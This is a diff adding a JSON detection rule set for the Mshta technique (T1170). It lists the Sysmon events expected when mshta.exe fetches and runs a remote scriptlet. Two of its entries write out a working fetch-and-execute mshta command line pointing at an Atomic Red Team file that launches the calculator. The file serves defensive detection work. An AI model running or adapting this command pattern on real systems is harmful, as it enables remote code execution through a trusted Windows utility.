@@ -1,0 +1,54 @@
+{
+	"name": "T1170 - Mshta",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility.",
+	"rules": {
+		"mshta_command": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing mshta with download command line.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\mshta.exe",
+				"Description": "Microsoft (R) HTML Application host",
+				"CommandLine": "mshta.exe  javascript:a=GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct\").Exec();close();"
+			}
+		},
+		"mshta_network": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Network connection detected",
+			"description": "Network activity from mshta.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\mshta.exe",
+				"DestinationIp": "151.101.132.133",
+				"DestinationPort": 443,
+				"DestinationPortName": "https"
+			}
+		},
+		"mshta_iecache": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing IE cache file.",
+			"payload": {
+				"Image": "C:\\Windows\\system32\\mshta.exe",
+				"TargetFilename": "C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\UTJ11V9C\\mshta[1].sct"
+			}
+		},
+		"mshta_child": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing process from mshta.",
+			"payload": {
+				"ParentImage": "C:\\Windows\\System32\\mshta.exe",
+				"ParentCommandLine": "mshta.exe  javascript:a=GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct\").Exec();close();",
+				"Image": "C:\\Windows\\System32\\calc.exe",
+				"Description": "Windows Calculator",
+				"CommandLine": "\"C:\\Windows\\System32\\calc.exe\""
+			}
+		}
+	}
+}
